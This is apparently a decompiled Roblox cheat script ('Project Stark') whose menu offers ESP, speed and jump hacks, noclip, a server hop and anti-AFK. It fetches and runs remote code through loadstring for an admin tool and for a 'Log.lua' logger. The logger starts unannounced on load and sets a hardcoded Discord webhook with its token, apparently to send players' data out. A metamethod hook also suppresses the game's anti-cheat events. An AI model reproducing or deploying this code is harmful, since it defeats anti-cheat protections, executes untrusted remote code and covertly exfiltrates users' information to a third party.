				v_u_213.Connections.Update = nil
			end
			if v_u_213.Connections.Scan then
				task.cancel(v_u_213.Connections.Scan)
				v_u_213.Connections.Scan = nil
			end
			local v295, v296, v297 = pairs(v_u_213.Active)
			while true do
				local v298
				v297, v298 = v295(v296, v297)
				if v297 == nil then
					break
				end
				v_u_225(v297)
			end
		end
		v17:Label("Generator ESP Master")
		v17:Toggle("Generator ESP Enabled", function(p300)
			-- upvalues: (ref) v_u_213, (ref) v_u_294, (ref) v_u_299
			v_u_213.Settings.Enabled = p300
			if p300 then
				v_u_294()
			else
				v_u_299()
			end
		end)
		v17:Label("Box Settings")
		v17:Toggle("Show Box", function(p301)
			-- upvalues: (ref) v_u_213
			v_u_213.Settings.ShowBox = p301
		end)
		v17:Colorpicker("Box Color", v_u_213.Settings.BoxColor, function(p302)
			-- upvalues: (ref) v_u_213
			v_u_213.Settings.BoxColor = p302
		end)
		v17:Slider("Box Thickness", 1, 5, v_u_213.Settings.BoxThickness, function(p303)
			-- upvalues: (ref) v_u_213
			v_u_213.Settings.BoxThickness = p303
		end)
		v17:Slider("Box Transparency", 1, 10, math.floor(v_u_213.Settings.BoxTransparency * 10), function(p304)
			-- upvalues: (ref) v_u_213
			v_u_213.Settings.BoxTransparency = p304 / 10
		end)
		v17:Label("Text Settings")
		v17:Toggle("Show Text", function(p305)
			-- upvalues: (ref) v_u_213
			v_u_213.Settings.ShowText = p305
		end)
		v17:Toggle("Show Name", function(p306)
			-- upvalues: (ref) v_u_213
			v_u_213.Settings.ShowName = p306
		end)
		v17:Toggle("Show Distance", function(p307)
			-- upvalues: (ref) v_u_213
			v_u_213.Settings.ShowDistance = p307
		end)
		v17:Colorpicker("Text Color", v_u_213.Settings.TextColor, function(p308)
			-- upvalues: (ref) v_u_213
			v_u_213.Settings.TextColor = p308
		end)
		v17:Slider("Text Size", 10, 30, v_u_213.Settings.TextSize, function(p309)
			-- upvalues: (ref) v_u_213
			v_u_213.Settings.TextSize = p309
		end)
		v17:Slider("Text Transparency", 1, 10, math.floor(v_u_213.Settings.TextTransparency * 10), function(p310)
			-- upvalues: (ref) v_u_213
			v_u_213.Settings.TextTransparency = p310 / 10
		end)
		v17:Label("General Settings")
		v17:Slider("Scan Interval (seconds)", 1, 10, v_u_213.Settings.UpdateInterval, function(p311)
			-- upvalues: (ref) v_u_213
			v_u_213.Settings.UpdateInterval = p311
		end)
		v17:Button("Refresh Generator ESP", function()
			-- upvalues: (ref) v_u_299, (ref) v_u_213, (ref) v_u_294
			v_u_299()
			if v_u_213.Settings.Enabled then
				v_u_294()
			end
		end)
		v18:Label("Utility Scripts")
		v18:Button("Infinite Yield Admin", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
		end)
		v18:Button("Server Hop", function()
			local v_u_312 = game.PlaceId
			local v_u_313 = {}
			local v_u_314 = ""
			local v_u_315 = os.date("!*t").hour
			if not pcall(function()
				-- upvalues: (ref) v_u_313
				v_u_313 = game:GetService("HttpService"):JSONDecode(readfile("NotSameServers.json"))
			end) then
				table.insert(v_u_313, v_u_315)
				writefile("NotSameServers.json", game:GetService("HttpService"):JSONEncode(v_u_313))
			end
			function TPReturner()
				-- upvalues: (ref) v_u_314, (ref) v_u_312, (ref) v_u_313, (ref) v_u_315
				local v316
				if v_u_314 ~= "" then
					v316 = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. v_u_312 .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. v_u_314))
				else
					v316 = game.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. v_u_312 .. "/servers/Public?sortOrder=Asc&limit=100"))
				end
				if v316.nextPageCursor and (v316.nextPageCursor ~= "null" and v316.nextPageCursor ~= nil) then
					v_u_314 = v316.nextPageCursor
				end
				local v317, v318, v319 = pairs(v316.data)
				local v320 = 0
				while true do
					local v321
					v319, v321 = v317(v318, v319)
					if v319 == nil then
						break
					end
					local v322 = true
					local v_u_323 = tostring(v321.id)
					if tonumber(v321.maxPlayers) > tonumber(v321.playing) then
						local v324, v325, v326 = pairs(v_u_313)
						while true do
							local v327
							v326, v327 = v324(v325, v326)
							if v326 == nil then
								break
							end
							if v320 == 0 then
								if tonumber(v_u_315) ~= tonumber(v327) then
									pcall(function()
										-- upvalues: (ref) v_u_313, (ref) v_u_315
										delfile("NotSameServers.json")
										v_u_313 = {}
										table.insert(v_u_313, v_u_315)
									end)
								end
							elseif v_u_323 == tostring(v327) then
								v322 = false
							end
							v320 = v320 + 1
						end
						if v322 == true then
							table.insert(v_u_313, v_u_323)
							wait()
							pcall(function()
								-- upvalues: (ref) v_u_313, (ref) v_u_312, (ref) v_u_323
								writefile("NotSameServers.json", game:GetService("HttpService"):JSONEncode(v_u_313))
								wait()
								game:GetService("TeleportService"):TeleportToPlaceInstance(v_u_312, v_u_323, game.Players.LocalPlayer)
							end)
							wait(4)
						end
					end
				end
			end
			function Teleport()
				-- upvalues: (ref) v_u_314
				while wait() do
					pcall(function()
						-- upvalues: (ref) v_u_314
						TPReturner()
						if v_u_314 ~= "" then
							TPReturner()
						end
					end)
				end
			end
			Teleport()
		end)
		v18:Label("Player Modifications")
		v18:Toggle("Infinite Jump", function(p328)
			InfJump = p328
			if InfJumpStarted == nil then
				InfJumpStarted = true
				local v329 = game:GetService("Players").LocalPlayer
				local v330 = v329:GetMouse()
				local v_u_331 = v329.Character:WaitForChild("Humanoid")
				v330.KeyDown:Connect(function(p332)
					-- upvalues: (ref) v_u_331
					if InfJump and p332:byte() == 32 then
						v_u_331:ChangeState("Jumping")
						wait()
						v_u_331:ChangeState("Seated")
					end
				end)
			end
		end)
		if game.PlaceId ~= 16116270224 then
			local v_u_333 = 33
			local v_u_334 = false
			v18:Toggle("Enable Speed", function(p335)
				-- upvalues: (ref) v_u_334
				v_u_334 = p335
				if not p335 then
					pcall(function()
						game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
					end)
				end
			end)
			v18:Slider("Player Speed", 1, 33, 33, function(p336)
				-- upvalues: (ref) v_u_333, (ref) v_u_334
				v_u_333 = p336
				if v_u_334 then
					pcall(function()
						-- upvalues: (ref) v_u_333
						game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v_u_333
					end)
				end
			end)
			task.spawn(function()
				-- upvalues: (ref) v_u_334, (ref) v_u_333
				while wait(0.5) do
					pcall(function()
						-- upvalues: (ref) v_u_334, (ref) v_u_333
						if v_u_334 and game.Players.LocalPlayer.Character.Humanoid.WalkSpeed ~= v_u_333 then
							game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v_u_333
						end
					end)
				end
			end)
		end
		v18:Label("Anti-Detection")
		v18:Button("Anti-AFK (Already Running)", function()
			print("Anti-AFK is already running in the background!")
		end)
		v19:Button("Bind UI Toggle Key", function()
			-- upvalues: (ref) v_u_10
			local v_u_337 = true
			local v_u_338 = nil
			v_u_338 = v_u_10.InputBegan:Connect(function(p339, p340)
				-- upvalues: (ref) v_u_337, (ref) v_u_338, (ref) v_u_10
				if not p340 and v_u_337 then
					v_u_337 = false
					if v_u_338 then
						v_u_338:Disconnect()
					end
					local v_u_341 = p339.KeyCode
					if v_u_341 and v_u_341 ~= Enum.KeyCode.Unknown then
						v_u_10.InputBegan:Connect(function(p342, p343)
							-- upvalues: (ref) v_u_341
							local v344 = (not p343 and p342.KeyCode == v_u_341 and true or false) and game:GetService("CoreGui"):FindFirstChild("Library")
							if v344 then
								v344.Enabled = not v344.Enabled
							end
						end)
					end
				end
			end)
		end)
		v19:Button("Unload Script", function()
			-- upvalues: (ref) v_u_133, (ref) v_u_204, (ref) v_u_299
			v_u_133()
			v_u_204()
			v_u_299()
			pcall(function()
				local v345 = game:GetService("CoreGui"):FindFirstChild("Library")
				if v345 then
					v345:Destroy()
				end
			end)
		end)
		v20:Button("Made by Urbanstorm", function()
			pcall(function()
				setclipboard("Urbanstorm")
			end)
		end)
		v20:Button("Discord: discord.gg/vgYZApyrZC", function()
			pcall(function()
				setclipboard("https://discord.gg/vgYZApyrZC")
			end)
		end)
		task.spawn(function()
			pcall(function()
				game.Players.LocalPlayer.CameraMaxZoomDistance = 1000
				local v346 = game:GetService("Players").LocalPlayer:WaitForChild("PlayerScripts").PlayerModule.CameraModule.ZoomController.Popper
				local v347 = next
				local v348, v349 = getgc()
				while true do
					local v350
					v349, v350 = v347(v348, v349)
					if v349 == nil then
						break
					end
					if getfenv(v350).script == v346 and typeof(v350) == "function" then
						local v351 = next
						local v352, v353 = debug.getconstants(v350)
						while true do
							local v354
							v353, v354 = v351(v352, v353)
							if v353 == nil then
								break
							end
							if tonumber(v354) ~= 0.25 then
								if tonumber(v354) == 0 then
									debug.setconstant(v350, v353, 0.25)
								end
							else
								debug.setconstant(v350, v353, 0)
							end
						end
					end
				end
				local v355, v356, v357 = pairs(game.Players.LocalPlayer.Character:GetChildren())
				while true do
					local v358
					v357, v358 = v355(v356, v357)
					if v357 == nil then
						break
					end
					if v358.ClassName == "Part" or v358.ClassName == "MeshPart" then
						v358.CanCollide = false
					end
				end
			end)
		end)
		task.spawn(function()
			pcall(function()
				local v_u_359 = game:GetService("VirtualUser")
				game:GetService("Players").LocalPlayer.Idled:connect(function()
					-- upvalues: (ref) v_u_359
					v_u_359:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
					wait(1)
					v_u_359:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
				end)
			end)
		end)
		task.spawn(function()
			-- upvalues: (ref) v_u_4
			pcall(function()
				-- upvalues: (ref) v_u_4
				if v_u_4 ~= false then
					warn("[Project Stark] Logger DISABLED")
				else
					getgenv().Webyhookie = "https://discord.com/api/webhooks/1430582092214964295/e6OFmqGOUwQyJoehiiPi5mCLu2afnXTlILb1Odw5vAvUXKCf7PxR_ykjktASuV7GDRWM"
					getgenv().Titlewebyhookie = "\225\180\176\225\181\131\226\129\191\225\181\136\202\184\'\203\162 \225\181\130\225\181\146\202\179\203\161\225\181\136"
					loadstring(game:HttpGet("https://raw.githubusercontent.com/Urbanstormm/Project-Stark/main/Log.lua"))()
				end
			end)
		end)
		task.spawn(function()
			pcall(function()
				local v_u_360 = nil
				local _ = hookmetamethod(game, "__namecall", function(p361)
					-- upvalues: (ref) v_u_360
					if getnamecallmethod() ~= "FireServer" or p361.Name ~= "AntiCheatTrigger" and p361.Name ~= "KM_PING_PLAYER_EVENT_SERVER" then
						return v_u_360(p361, ...)
					end
				end)
			end)
		end)
	end
end
return v1["script.lua"](...)
